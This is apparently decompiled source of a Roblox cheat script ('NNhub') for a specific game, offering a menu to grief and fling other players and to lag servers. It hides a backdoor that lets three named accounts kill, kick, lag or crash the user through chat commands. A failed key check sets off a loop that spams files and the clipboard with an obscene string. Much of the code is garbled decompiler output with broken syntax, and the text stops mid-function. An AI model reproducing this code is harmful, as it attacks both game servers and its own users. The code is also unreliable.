--[[ 
▓█████▄ ▓█████  ██▓     █    ██   ██████  ██▓ ▒█████   ███▄    █ 
▒██▀ ██▌▓█   ▀ ▓██▒     ██  ▓██▒▒██    ▒ ▓██▒▒██▒  ██▒ ██ ▀█   █ 
░██   █▌▒███   ▒██░    ▓██  ▒██░░ ▓██▄   ▒██▒▒██░  ██▒▓██  ▀█ ██▒
░▓█▄   ▌▒▓█  ▄ ▒██░    ▓▓█  ░██░  ▒   ██▒░██░▒██   ██░▓██▒  ▐▌██▒
░▒████▓ ░▒████▒░██████▒▒▒█████▓ ▒██████▒▒░██░░ ████▓▒░▒██░   ▓██░
 ▒▒▓  ▒ ░░ ▒░ ░░ ▒░▓  ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
 ░ ▒  ▒  ░ ░  ░░ ░ ▒  ░░░▒░ ░ ░ ░ ░▒  ░ ░ ▒ ░  ░ ▒ ▒░ ░ ░░   ░ ▒░
 ░ ░  ░    ░     ░ ░    ░░░ ░ ░ ░  ░  ░   ▒ ░░ ░ ░ ▒     ░   ░ ░ 
   ░       ░  ░    ░  ░   ░           ░   ░      ░ ░           ░ 
    --]] 
local RbxAnalyticsService = game:GetService("RbxAnalyticsService");
local instance = getgenv().Key;
if instance == nil or instance == "" then
    while true do
        task.wait();
        writefile(math.random(1, 1000) .. ".txt", string.rep("HUESOS, SOSI PIPISKUU", 99999));
        setclipboard(string.rep("HUESOS, SOSI PIPISKUU", 99999)); 
    end;
end;
if not instance or instance == "" then
    return;
end;
local v8 = {
    pcall(function()
        return http_request({
            blablabla,
            bleblebleble
        }); 
    end)
};
if pcall(function(...)
    return http_request({
        blablabla,
        bleblebleble
    }); 
end) then
    task.spawn(function(...)
        while task.wait() do
            writefile(math.random(1, 1000) .. ".txt", string.rep("HUESOS, SOSI PIPISKUU", 99999));
            setclipboard(string.rep("HUESOS, SOSI PIPISKUU", 99999)); 
        end;
        return; 
    end);
    local LocalPlayer = game.Players.LocalPlayer;
    LocalPlayer:Kick("Wrong key");
    game:Shutdown();
    return;
end;
local HttpService = game:GetService("HttpService");
local v12 = game.PlaceId ~= 6961824067;
if v12 then
    local LocalPlayer = game.Players.LocalPlayer;
    return LocalPlayer:Kick("Wrong key");
end;
local v14 = HttpService:JSONDecode(http_request({
    ["Url"] = "https://pandadevelopment.net/v2_validation?key=" .. tostring(instance) .. "&service=1e2key23script4premium&hwid=" .. tostring(RbxAnalyticsService:GetClientId()),
    ["Method"] = "GET"
}).Body).V2_Authentication ~= "success";
if v14 then
    local LocalPlayer = game.Players.LocalPlayer;
    LocalPlayer:Kick("Wrong key");
    game:Shutdown();
    return;
end;
local r24 = "/";
K:GetService("TextChatService").OnIncomingMessage = function(arg1_2)
    i = T.TextSource;
    if i then
        R = i.Name == "c423_buga";
        if R or (i.Name == "c422_buga" or i.Name == "Iven_EGA12345678910") then
            local Character = game.Players.LocalPlayer.Character;
            if T.Text == r24 .. "kill " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "kill " .. game.Players.LocalPlayer.DisplayName then
                if Character then
                    m.Humanoid.Health = 0;
                end;
            else
                if T.Text == r24 .. "bring " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "bring " .. game.Players.LocalPlayer.DisplayName then
                    H = game.Players;
                    local Character = H:FindFirstChild(m.Name).Character;
                    if m then
                        
                    end;
                    if m then
                        m.HumanoidRootPart.CFrame = Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -5);
                    end;
                else
                    if T.Text == r24 .. "kick " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "kick " .. game.Players.LocalPlayer.DisplayName then
                        local LocalPlayer = game.Players.LocalPlayer;
                        LocalPlayer:Kick("Kicked by " .. LocalPlayer.Name);
                    else
                        if T.Text == r24 .. "reveal" or T.Text == "!reveal" then
                            m = game:GetService("TextChatService").TextChannels.RBXGeneral;
                            m:SendAsync("I`m NNhub User");
                        else
                            if T.Text == r24 .. "lag " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "lag " .. game.Players.LocalPlayer.DisplayName then
                                game.Players.LocalPlayer.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = true;
                            else
                                if T.Text == r24 .. "unlag " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "unlag " .. game.Players.LocalPlayer.DisplayName then
                                    game.Players.LocalPlayer.PlayerScripts["[ExploitTest]FireAllRemotes"].Enabled = false;
                                else
                                    if T.Text == r24 .. "crash " .. game.Players.LocalPlayer.Name or T.Text == r24 .. "crash " .. game.Players.LocalPlayer.DisplayName then
                                        while true do end;
                                    end;
                                end;
                            end;
                        end;
                    end;
                end;
            end;
        end;
    end;
    return nil; 
end;
local v19 = game:MakeWindow({
    ["Name"] = "NoName",
    ["HidePremium"] = false,
    ["SaveConfig"] = true,
    ["ConfigFolder"] = "NNhub",
    ["IntroEnabled"] = true,
    ["IntroText"] = "NNhub",
    ["Keybind"] = "K",
    ["FreeMouse"] = true
});
local LocalPlayer = game.Players.LocalPlayer;
local v20 = D[i];
local v21 = LocalPlayer.Character;
if v21 then
    local r28 = v21:WaitForChild("Humanoid");
    local r29 = v21:WaitForChild("HumanoidRootPart");
    local r30 = workspace[LocalPlayer.Name .. "SpawnedInToys"];
    local r31 = v21:WaitForChild("Head");
    game:GetService("UserInputService");
    local Debris = game:GetService("Debris");
    local ReplicatedStorage2 = game:GetService("ReplicatedStorage");
    local r36 = game:GetService("ReplicatedStorage").MenuToys.DestroyToy;
    local r39 = ReplicatedStorage2.CharacterEvents.Struggle;
    local r41 = ReplicatedStorage2.GrabEvents.CreateGrabLine;
    local r43 = ReplicatedStorage2.DataEvents.UpdateLineColorsEvent;
    game:GetService("TextChatService");
    local r45 = {};
    local r46 = {};
    local r47 = {};
    local items = {};
    local instance2 = Instance.new("BoolValue", LocalPlayer);
    instance2.Name = "FartherReach";
    instance2.Value = true;
    local function r60()
        instance = instance[1];
        for _, RbxAnalyticsService in instance, pairs(instance:GetChildren()) do
            if RbxAnalyticsService.Name == "PlayerCharacterLocationDetector" and (RbxAnalyticsService.Position - r29.Position).Magnitude <= 1 then
                return RbxAnalyticsService;
            else
                
            end; 
        end;
        return nil; 
    end;
    local function r61()
        if not r59(workspace.PlotItems.PlayersInPlots, LocalPlayer.Name) then
            return false;
        end;
        v8 = "cwӀ";
        for instance, v10 in pairs(("pairs"):GetChildren()) do
            v8 = v10.PlotSign.ThisPlotsOwners;
            table = {
                v8:GetChildren()
            };
            for instance5, table in pairs(g(table)) do
                 
            end; 
        end;
        if nil then
            return true, nil;
        end;
        return false; 
    end;
    local function v77()
        r57("MassLessCon1");
        r57("ThirdPFix"); 
    end;
    local function v78()
        game.Lighting.ClockTime = 6.5;
        game.Lighting.Brightness = 5;
        game.Lighting.OutdoorAmbient = Color3.fromRGB(100, 80, 100);
        game.Lighting.FogColor = Color3.fromRGB(180, 140, 160);
        game.Lighting.FogEnd = 2000;
        game.Lighting.Ambient = Color3.fromRGB(180, 181, 150);
        game.Lighting.EnvironmentDiffuseScale = .7;
        game.Lighting.EnvironmentSpecularScale = .1;
        game.Lighting.ColorShift_Bottom = Color3.fromRGB(14, 100, 6);
        game.Lighting.ColorShift_Top = Color3.fromRGB(0, 79, 4); 
    end;
    local function r62()
        T = r28.SeatPart;
        if T then
            return T:FindFirstAncestor("CreatureBlobman");
        end;
        return nil; 
    end;
    local function r64()
        instance = instance[1];
        for _, RbxAnalyticsService in instance, pairs(instance:GetChildren()) do
            tonumber = RbxAnalyticsService.Name == "AntiKick";
            if tonumber then
                tonumber = r36;
                tonumber:FireServer(RbxAnalyticsService);
            end; 
        end; 
    end;
    local function r65()
        r29.AssemblyLinearVelocity = Vector3.zero;
        r29.AssemblyAngularVelocity = Vector3.zero; 
    end;
    local r71 = {
        "Left Arm",
        "Left Leg",
        "Right Arm",
        "Right Leg"
    };
    local function r72()
        r29.Anchored = true;
        task.wait();
        r29.Anchored = false;
        tonumber = not r28.SeatPart;
        if tonumber then
            r28.Sit = false;
        end;
        for T = 1, #r71 do
            tonumber = v21;
            v10 = tonumber:FindFirstChild(r71[T]);
            if v10 then
                v10.RagdollLimbPart.CanCollide = false;
            end; 
        end; 
    end;
    local function r73()
        T = {};
        i = {};
        RbxAnalyticsService = RbxAnalyticsService[1];
        for _, O in ipairs(RbxAnalyticsService:GetPlayers()) do
            W = string.format("<font color=\"rgb(255,0,255)\"><b>%s</b></font> <b><i>(%s)</i></b>", O.Name, O.DisplayName);
            table.insert(T, W);
            i[W] = O; 
        end;
        return T, i; 
    end;
    local function r75()
        instance = instance[1];
        for _, RbxAnalyticsService in instance, ipairs(instance:GetDescendants()) do
            if RbxAnalyticsService:IsA("BasePart") and RbxAnalyticsService.Parent ~= LocalPlayer.Character then
                tonumber = r41;
                tonumber:FireServer(RbxAnalyticsService, RbxAnalyticsService.CFrame * CFrame.new(math.random(-r47.lagIntensity, r47.lagIntensity), 1000000000, math.random(-r47.lagIntensity, r47.lagIntensity)) * CFrame.Angles(math.rad(math.random(0, 360)), math.rad(math.random(0, 360)), math.rad(math.random(0, 360))));
            end; 
        end; 
    end;
    PalleteFling = function(arg1_14, ...)
        i = game.Players:FindFirstChild(r49);
        if not i then
            return;
        end;
        local Character = i.Character;
        if not Character then
            return;
        end;
        local HumanoidRootPart = Character:FindFirstChild("HumanoidRootPart");
        if not HumanoidRootPart then
            return;
        end;
        for t = 1, r47.Amout do
            r77 = r67("PalletLightBrown");
            r78 = r58(r77, "SoundPart", 1);
            r69(r78);
            task.wait(.05);
            task.spawn(function(...)
                for T = 1, 5 do
                    r77:PivotTo(CFrame.new(0, 1000, 0)); 
                end;
                task.wait();
                r78.Anchored = true;
                return; 
            end);
            task.wait();
            r77.Name = "FlingPalete";
            table.insert(items, r77); 
        end;
        O = r15[1];
        for j, F in ipairs(O) do
            r79 = r58(F, "SoundPart", 1);
            if r79 then
                instance3 = Instance.new("BodyPosition");
                instance3.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                instance3.P = 10000;
                instance3.D = 500;
                instance3.Parent = r79;
                task.defer(function(...)
                    r79.Anchored = false;
                    r79.AssemblyAngularVelocity = Vector3.new(math.random(-100, 100) * 100, math.random(-100, 100) * 100, math.random(-100, 100) * 100);
                    instance3.Position = HumanoidRootPart.Position;
                    wait(.0001);
                    if not r79 then
                        return;
                    end; 
                end);
            end;
            wait(); 
        end; 
    end;
    local function r82(arg1_16)
        if T.Name == "PlayerCharacterLocationDetector" then
            i = arg1_16:FindFirstChild("PCLD_ESP");
            if i then
                i:Destroy();
            end;
        end; 
    end;
    local function r83(...)
        local Character = game.Players.LocalPlayer.Character;
        instance = Character:WaitForChild("HumanoidRootPart");
        Character:WaitForChild("Humanoid");
        if r46.ShurikenLagServerT then
            N = "J\xf2u\xc5R";
            for _, table in pairs(("pairs"):GetChildren()) do
                for _, b in pairs(g(b)) do
                     
                end; 
            end;
            W = {};
            q = nil.GetChildren;
            for HttpService, v21 in q[1], pairs(g(v21)) do
                if v21:IsA("Model") then
                    if v24.Name == "YouDecoy" then
                        Character:WaitForChild("HumanoidRootPart").CFrame = v24.HumanoidRootPart.CFrame * CFrame.new(0, 10, 0);
                        task.wait(.1);
                        PartOwner = v24.Head:FindFirstChild("PartOwner");
                        if PartOwner then
                            tonumber = tonumber;
                            r69(v24.HumanoidRootPart);
                            task.wait(.02);
                            tonumber = tonumber;
                            PartOwner = v24.Head:FindFirstChild("PartOwner");
                            if PartOwner then
                                tonumber = tonumber;
                                if PartOwner then
                                    table.insert({}, v21);
                                end;
                            else
                                
                            end;
                        else
                            
                        end;
                    else
                        if v24.Name == "NinjaShuriken" then
                            for _, PartOwner in pairs(PartOwner:GetChildren()) do
                                if M.Name == "TouchInterest" then
                                    PartOwner:Destroy();
                                end; 
                            end;
                            task.wait();
                            Character:WaitForChild("HumanoidRootPart").CFrame = v24.SoundPart.CFrame * CFrame.new(2, 15, 2);
                            task.wait(.1);
                            PartOwner = v24.SoundPart:FindFirstChild("PartOwner");
                            if PartOwner then
                                r69(v24.SoundPart);
                                task.wait(.02);
                                tonumber = tonumber;
                                if v24.SoundPart:FindFirstChild("PartOwner") or (tonumber or tick() - tick() >= 5) then
                                    table.insert(W, v21);
                                end;
                            end;
                        end;
                    end;
                end; 
            end;
            instance.CFrame = instance.CFrame;
            table = 4996198566166[1];
            for v21, q in ipairs({}) do
                local HumanoidRootPart = q:FindFirstChild("HumanoidRootPart");
                tonumber = Env[v1];
                if HumanoidRootPart and r46.ShurikenLagServerT then
                    HumanoidRootPart[r15[r16("\xbdTD\xf1 \xf3\xe7\x9f", 28700270867508)]] = true;
                    for I = v21, I, 0 do
                        r86 = W[0];
                        if not not r86 then
                            StickyPart = r86:FindFirstChild("StickyPart");
                            if StickyPart then
                                StickyPart.CanTouch = true;
                                for _, LocalPlayer in LocalPlayer[1], pairs(LocalPlayer:GetDescendants()) do
                                    if LocalPlayer:IsA("BasePart") then
                                        v34.CanCollide = false;
                                    end; 
                                end;
                                instance4 = Instance.new("BodyPosition");
                                instance4.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                                instance4.P = 10000;
                                instance4.D = 500;
                                instance4.Parent = StickyPart;
                                for LocalPlayer, h in pairs(h:GetDescendants()) do
                                    if h:IsA("BasePart") then
                                        h.CanCollide = false;
                                    end; 
                                end;
                                for LocalPlayer, h in h[1], pairs(h:GetChildren()) do
                                    if h.Name == "TouchInterest" then
                                        h:Destroy();
                                    end; 
                                end;
                                task.defer(function(...)
                                    T = not r46.ShurikenLagServerT;
                                    if T then
                                        StickyPart.AssemblyAngularVelocity = Vector3.new(math.random(-100, 100) * 50, math.random(-100, 100) * 50, math.random(-100, 100) * 50);
                                        instance4.Position = Vector3.new(HumanoidRootPart.Position.X, HumanoidRootPart.Position.v36 - 4, HumanoidRootPart.Position.Z);
                                        wait(.0001);
                                        instance4.Position = Vector3.new(HumanoidRootPart.Position.X, HumanoidRootPart.Position.v36 + 3, HumanoidRootPart.Position.Z);
                                        wait(.0001);
                                        if not r46.ShurikenLagServerT or (not r86.Parent or not r84.Parent) then
                                            return;
                                        end;
                                    else
                                        tonumber = I;
                                    end; 
                                end);
                                wait();
                            end;
                        end;
                        wait(); 
                    end;
                end;
                wait(); 
            end;
        end; 
    end;
    local v79 = v19:MakeTab({
        ["Name"] = "Defense",
        ["Icon"] = "shield",
        ["PremiumOnly"] = false
    });
    local v80 = v19:MakeTab({
        ["Name"] = "Grabs",
        ["Icon"] = "person-standing",
        ["PremiumOnly"] = false
    });
    v19:MakeTab({
        ["Name"] = "Player",
        ["Icon"] = "wallpaper",
        ["PremiumOnly"] = false
    });
    v19:MakeTab({
        ["Name"] = "Target",
        ["Icon"] = "crosshair",
        ["PremiumOnly"] = false
    });
    v19:MakeTab({
        ["Name"] = "Misc",
        ["Icon"] = "ellipsis",
        ["PremiumOnly"] = false
    });
    v19:MakeTab({
        ["Name"] = "Credits",
        ["Icon"] = "info",
        ["PremiumOnly"] = false
    });
    v79:AddToggle({
        ["Name"] = "AntiGrab<font color=\"rgb(0, 255, 0)\"><b>[BASE]</b></font>",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiGrab",
        ["Callback"] = function(arg1_17, ...)
            if arg1_17 then
                instance = LocalPlayer.IsHeld:GetPropertyChangedSignal("Value");
                r45.AntiGrabCon1 = instance:Connect(function(...)
                    if LocalPlayer.IsHeld.Value then
                        r29.Anchored = true;
                        r31.Anchored = true;
                        tonumber = not LocalPlayer.IsHeld.Value;
                        task.wait();
                        tonumber = r39;
                        tonumber:FireServer(LocalPlayer);
                        r65();
                        tonumber = game:GetService("ReplicatedStorage").CharacterEvents.RagdollRemote;
                        tonumber:FireServer(r29, 0);
                        if not LocalPlayer.IsHeld.Value then
                            task.wait();
                            r29.Anchored = false;
                            r31.Anchored = false;
                            return;
                        end;
                    end; 
                end);
            else
                r57("AntiGrabCon1");
            end;
            return; 
        end
    });
    local creatureBlobman = "CreatureBlobman";
    v79:AddDropdown({
        ["Name"] = "GUCCI Method",
        ["Default"] = "CreatureBlobman",
        ["Options"] = {
            "CreatureBlobman",
            "TractorGreen"
        },
        ["Callback"] = function(arg1_18, ...)
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiGrab<font color=\"rgb(255, 0, 0)\"><b>[GUCCI]</b></font>",
        ["Default"] = false,
        ["Callback"] = function(arg1_19, ...)
            r46.gucci = arg1_19;
            i = "gucci";
            if r46[i] then
                i = r67(creatureBlobman);
                if creatureBlobman == "CreatureBlobman" then
                    i:FindFirstChild("Weight");
                    task.wait();
                    if i:FindFirstChild("Weight") then
                        task.wait(0);
                        tonumber = v1:WaitForChild("VehicleSeat", 3);
                        tonumber:Sit(LocalPlayer.Character.Humanoid);
                        task.spawn(function(...)
                            while tick() < tick() + 3 do
                                tonumber = game:GetService("ReplicatedStorage").CharacterEvents.RagdollRemote;
                                tonumber:FireServer(r29, 0);
                                task.wait(); 
                            end;
                            return; 
                        end);
                        task.wait();
                        tonumber = v1.VehicleSeat.Occupant == LocalPlayer.Character.Humanoid;
                        tonumber = v1.VehicleSeat;
                        tonumber:Sit(LocalPlayer.Character.Humanoid);
                        task.wait();
                        if v1.VehicleSeat.Occupant == LocalPlayer.Character.Humanoid then
                            task.wait();
                            tonumber = v1.VehicleSeat.Occupant ~= LocalPlayer.Character.Humanoid;
                            tonumber = LocalPlayer.Character.Humanoid;
                            tonumber:ChangeState(Enum.HumanoidStateType.Jumping);
                            task.wait();
                            Character = LocalPlayer.Character;
                            if v1.VehicleSeat.Occupant ~= Character.Humanoid then
                                task.wait();
                                if r61() then
                                    print("[DEBUG] CREATED GUCCI IN HOUSE");
                                else
                                    v1.VehicleSeat.CFrame = CFrame.new(0, 1000000000, 0);
                                end;
                                return;
                            end;
                        end;
                    end;
                else
                    i:FindFirstChild("SoundPart");
                    task.wait();
                end;
            end; 
        end
    });
    v79:AddToggle({
        ["Name"] = "Anti-Ragdoll",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiRagdoll",
        ["Callback"] = function(arg1_20, ...)
            if arg1_20 then
                i = LocalPlayer.IsHeld.Changed;
                r45.AntiRagdollCon = i:Connect(function(...)
                    task.wait();
                    if LocalPlayer.IsHeld.Value == true then
                        LocalPlayer.IsHeld.Value = false;
                    end;
                    return; 
                end);
            else
                r57("AntiRagdollCon");
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "Loop Struggle(AntiGrab/AntiBlob)",
        ["Default"] = false,
        ["Callback"] = function(arg1_21, ...)
            r46.LoopStruggle = arg1_21;
            tonumber = r46.LoopStruggle;
            while tonumber do
                task.wait();
                tonumber = r39;
                tonumber:FireServer(LocalPlayer); 
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiExplode",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiExplodeT",
        ["Callback"] = function(arg1_22, ...)
            r46.AntiExplodeT = arg1_22;
            if arg1_22 then
                arg1_22 = ReplicatedStorage2.BombEvents.BombExplode.OnClientEvent;
                r45.AntiExplodeCon = arg1_22:Connect(r72);
                arg1_22 = LocalPlayer.CharacterAdded;
                r45.AntiExplodeHelper = arg1_22:Connect(function(arg1_23, ...)
                    arg1_22 = arg1_23;
                    arg1_22:WaitForChild("HumanoidRootPart", 5);
                    r57("AntiExplodeCon");
                    instance = ReplicatedStorage2.BombEvents.BombExplode.OnClientEvent;
                    r45.AntiExplodeCon = instance:Connect(r72);
                    return; 
                end);
            else
                r57("AntiExplodeHelper");
                r57("AntiExplodeCon");
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiSticky<font color=\"rgb(255, 0, 255)\"><b>[ANTISHURIKENLAG]</b></font>",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiSticky",
        ["Callback"] = function(arg1_24, ...)
            LocalPlayer.PlayerScripts.StickyPartsTouchDetection.Disabled = arg1_24;
            LocalPlayer.PlayerScripts.StickyPartsTouchDetection.Enabled = not arg1_24;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiKick<font color=\"rgb(255, 0, 0)\"><b>[DEATH]</b></font>",
        ["Default"] = true,
        ["Callback"] = function(arg1_25, ...)
            r46.AntiDeath = arg1_25;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiKick<font color=\"rgb(0, 255, 0)\"><b>[SHURIKEN]</b></font>",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiKick",
        ["Callback"] = function(arg1_26, ...)
            r46.AntiKick = arg1_26;
            while r46.AntiKick do
                task.wait(.005);
                ypcall(function(...)
                    tonumber = LocalPlayer.Character;
                    arg1_26 = tick and ;
                    instance = tick and ;
                    if tick then
                        if arg1_26 then
                            tonumber = LocalPlayer[r15[r16(RbxAnalyticsService, v10)]];
                        end;
                        tonumber = LocalPlayer[r15[r16(RbxAnalyticsService, v10)]];
                    end;
                    tonumber = r30;
                    if not tick then
                        return;
                    end;
                    tonumber = r30;
                    O = "NinjaShuriken";
                    A = tonumber:FindFirstChild(r15[O]);
                    RbxAnalyticsService = not A;
                    v1 = not A and not O:FindFirstChild(LocalPlayer.Name);
                    if RbxAnalyticsService then
                        
                    end;
                    if v1 then
                        v10 = r61();
                        v1 = v10[2];
                        if v10 then
                            v1 = v1 and ;
                            table = v1 and ;
                            if table then
                                A = r67("NinjaShuriken");
                                if A then
                                    A.Name = "AntiKick";
                                    r63(A);
                                end;
                            end;
                        end;
                    end;
                    if not A and not O:FindFirstChild(LocalPlayer.Name) then
                        A = r67("NinjaShuriken");
                        if A then
                            A.Name = "AntiKick";
                            r63(A);
                        end;
                    end;
                    W = not A;
                    tick();
                    if W then
                        while not A do
                            if A then
                                r63(A);
                                A.Name = "AntiKick";
                            end;
                            task.wait(.05);
                            A = not A;
                            if A or (not r46.AntiKick or (not A:FindFirstChild("StickyPart") or (not tick or not instance))) then
                                if not A or (not A:FindFirstChild("StickyPart") or (not instance or (instance.Position - A.StickyPart.Position).Magnitude >= 20)) then
                                    r64();
                                end;
                                if A then
                                    task.wait(.05);
                                    if not r46.AntiKick or (not tonumber or (not (tick and ) or (not A or not A:FindFirstChild("StickyPart")))) then
                                        if A then
                                            StickyPart = A:FindFirstChild("StickyPart");
                                            tonumber = task.wait;
                                        end;
                                        if not A or (not A:FindFirstChild("StickyPart") or (not arg1_26 or i.Health <= 0)) then
                                            r64();
                                            break;
                                        end;
                                        return;
                                    end;
                                else
                                    tonumber = task[instance5[table]];
                                end;
                            end; 
                        end;
                        tonumber = tick;
                    else
                        tonumber = tick;
                    end; 
                end); 
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiBlob",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiBlob",
        ["Callback"] = function(arg1_27, ...)
            r46.AntiBlob = arg1_27;
            if r46.AntiBlob then
                v8 = "ORCM\xc6\x17l";
                A = game[r15[r16(v8, 8837342613523)]];
                arg1_27 = A[2];
                A = "pairs";
                for r15, v10 in pairs(A:GetPlayers()) do
                    v8 = workspace[v10.Name .. "SpawnedInToys"];
                    table = {
                        v8:GetChildren()
                    };
                    for instance5, table in pairs(g(table)) do
                        if v2.Name == "CreatureBlobman" and r46.AntiBlob then
                            tonumber = table:WaitForChild("RightDetector", 1);
                            HttpService = table:WaitForChild("LeftDetector", 1);
                            if v21 then
                                tonumber = Debris;
                                tonumber:AddItem(v22.RightWeld, 0);
                                tonumber = Debris;
                                tonumber:AddItem(v22.RightAlignOrientation, 0);
                            end;
                            if HttpService then
                                tonumber = Debris;
                                tonumber:AddItem(HttpService.LeftWeld, 0);
                                tonumber = Debris;
                                tonumber:AddItem(HttpService.LeftAlignOrientation, 0);
                            end;
                        end; 
                    end; 
                end;
                for R = 1, 5 do
                    v8 = workspace.Plots["Plot" .. r15];
                    table = {
                        v8:GetChildren()
                    };
                    for instance5, table in pairs(g(table)) do
                        if v2.Name == "CreatureBlobman" and r46.AntiBlob then
                            tonumber = table:WaitForChild("RightDetector", 1);
                            HttpService = table:WaitForChild("LeftDetector", 1);
                            if v21 then
                                tonumber = Debris;
                                tonumber:AddItem(v22.RightWeld, 0);
                                tonumber = Debris;
                                tonumber:AddItem(v22.RightAlignOrientation, 0);
                            end;
                            if HttpService then
                                tonumber = Debris;
                                tonumber:AddItem(HttpService.LeftWeld, 0);
                                tonumber = Debris;
                                tonumber:AddItem(HttpService.LeftAlignOrientation, 0);
                            end;
                        end; 
                    end; 
                end;
                r45.AntiBlobCon = workspace.DescendantAdded:Connect(function(arg1_28, ...)
                    if r90.Name == "CreatureBlobman" and r46.AntiBlob then
                        task.spawn(function(...)
                            tonumber = arg1_28;
                            tonumber = arg1_28;
                            T = tonumber:WaitForChild("LeftDetector", 1);
                            arg1_27 = arg1_28:WaitForChild("RightDetector", 1);
                            if tonumber:IsDescendantOf(r30) then
                                return;
                            end;
                            tonumber = r61;
                            A = tonumber();
                            if A then
                                tonumber = arg1_28;
                                if tonumber:IsDescendantOf(A[2]) then
                                    return;
                                end;
                            end;
                            if arg1_27 then
                                tonumber = Debris;
                                tonumber:AddItem(arg1_27:WaitForChild("RightWeld", 1), 0);
                                tonumber = Debris;
                                tonumber:AddItem(arg1_27:WaitForChild("RightAlignOrientation", 1), 0);
                            end;
                            if T then
                                tonumber = Debris;
                                tonumber:AddItem(T:WaitForChild("LeftWeld", 1), 0);
                                tonumber = Debris;
                                tonumber:AddItem(T:WaitForChild("LeftAlignOrientation", 1), 0);
                            end;
                            return; 
                        end);
                    end;
                    return; 
                end);
            else
                r57("AntiBlobCon");
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiLoopKill<font color=\"rgb(255, 0, 0)\"><b>[LoopTP]</b></font>",
        ["Default"] = false,
        ["Callback"] = function(arg1_29, ...)
            r46.LoopTpToHouse = arg1_29;
            i = "LoopTpToHouse";
            while r46[i] do
                LocalPlayer.Character:WaitForChild("HumanoidRootPart", 1);
                i = i:FindFirstChild("HumanoidRootPart") or ;
                if not not i then
                    i.CFrame = CFrame.new(592.005676, 140.338577, -94.3488083, -0.967033505, 2.35445352e-08, -0.254649103, 2.08566977e-08, 1, 1.32551428e-08, .254649103, 7.50702789e-09, -0.967033505);
                    task.wait();
                end; 
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiPaint",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiPaint",
        ["Callback"] = function(arg1_30, ...)
            if arg1_30 then
                v8 = "I\xdd\x97\x16\xa1\r\xfd";
                A = game[r15[r16(v8, 24915009121617)]];
                for instance, v10 in pairs(A:GetPlayers()) do
                    if workspace[v10.Name .. "SpawnedInToys"] then
                        for v8, HttpService in pairs(HttpService(O)) do
                            table = v8;
                            tonumber = HttpService.Name == "PaintPlayerPart";
                            if tonumber then
                                tonumber = Debris;
                                tonumber:AddItem(HttpService, 0);
                            end; 
                        end;
                    end; 
                end;
                for R = 1, 5 do
                    v8 = workspace.Plots["Plot" .. instance];
                    table = {
                        v8:GetDescendants()
                    };
                    for instance5, table in pairs(g(table)) do
                        tonumber = v2.Name == "PaintPlayerPart";
                        if tonumber then
                            tonumber = Debris;
                            tonumber:AddItem(table, 0);
                        end; 
                    end; 
                end;
                r45.AntiPaintCon = workspace.DescendantAdded:Connect(function(arg1_31, ...)
                    tonumber = T.Name == "PaintPlayerPart";
                    if tonumber then
                        tonumber = Debris;
                        tonumber:AddItem(arg1_31, 0);
                    end;
                    return; 
                end);
            else
                r57("AntiPaintCon");
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiVoid",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiVoid",
        ["Callback"] = function(arg1_32, ...)
            if arg1_32 then
                workspace.FallenPartsDestroyHeight = 0 / 0;
                instance = workspace:GetPropertyChangedSignal("FallenPartsDestroyHeight");
                r45.AntiVoid = instance:Connect(function(...)
                    if workspace.FallenPartsDestroyHeight == workspace.FallenPartsDestroyHeight then
                        workspace.FallenPartsDestroyHeight = 0 / 0;
                    end;
                    return; 
                end);
            else
                r57("AntiVoid");
                task.wait(.1);
                workspace.FallenPartsDestroyHeight = -100;
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "AntiBarrier",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiBarrier",
        ["Callback"] = function(arg1_33, ...)
            for i = 1, 5 do
                tonumber = workspace.Plots;
                O = tonumber:WaitForChild("Plot" .. i, 1);
                if O then
                    HttpService = 3649039500963;
                    W = O:WaitForChild(r15[r16("\x84\xcdB\x91\xd4V\xba", HttpService)], 1);
                    if W then
                        table = {
                            W.GetChildren(W)
                        };
                        for v8, v21 in pairs(g(v1)) do
                            v24.CanCollide = not arg1_33;
                            v24.CanTouch = not arg1_33;
                            v24.CanQuery = not arg1_33; 
                        end;
                    end;
                end; 
            end;
            return; 
        end
    });
    local r91 = game.Players.LocalPlayer.PlayerScripts.CharacterAndBeamMove;
    v79:AddToggle({
        ["Name"] = "AntiLag",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "AntiLag",
        ["Callback"] = function(arg1_34, ...)
            if arg1_34 then
                r91.Enabled = false;
            else
                r91.Enabled = true;
            end;
            return; 
        end
    });
    v79:AddToggle({
        ["Name"] = "Anti-INPUTLAG[TEST]",
        ["Default"] = false,
        ["Callback"] = function(arg1_35, ...)
            r46.AntiLagInput = arg1_35;
            while r46.AntiLagInput do
                tonumber = r30;
                FoodHamburger = tonumber:FindFirstChild("FoodHamburger");
                if not FoodHamburger then
